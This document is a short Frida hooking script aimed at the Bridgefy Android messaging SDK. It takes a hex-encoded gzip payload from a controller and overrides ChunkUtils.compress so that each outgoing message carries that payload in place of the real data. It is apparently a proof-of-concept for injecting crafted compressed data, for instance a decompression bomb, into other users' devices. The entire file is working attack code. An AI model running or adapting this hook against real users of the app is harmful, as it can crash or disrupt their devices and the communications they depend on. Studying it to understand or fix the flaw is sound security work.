const PATH_HEX = 'org.apache.commons.codec.binary.Hex';
const PATH_STRING = 'java.lang.String';

const PATH_CHUNKUTILS = 'com.bridgefy.sdk.framework.controller.ChunkUtils';

let gzipPayload;

function decodeHex(data) {
	let JHex = Java.use(PATH_HEX);
	let JString = Java.use(PATH_STRING);
	const hexChars = JString.$new(gzipPayload).toCharArray();
	return JHex.decodeHex(hexChars);
}

function run() {
	let JChunkUtils = Java.use(PATH_CHUNKUTILS);

	const payload = decodeHex(gzipPayload);
	send('[+] Received payload of size ' + payload.length);

	JChunkUtils.compress.implementation = function (_data) {
		send('[*] ChunkUtils.compress(...)');

		// The value returned here is "used" once encrypted; we need to instantiate a new array.
		return decodeHex(gzipPayload);
	};
}

recv('params', function onMessage(post) {
	gzipPayload = post.gzipPayload;

	setImmediate(function () { Java.perform(run) });
});
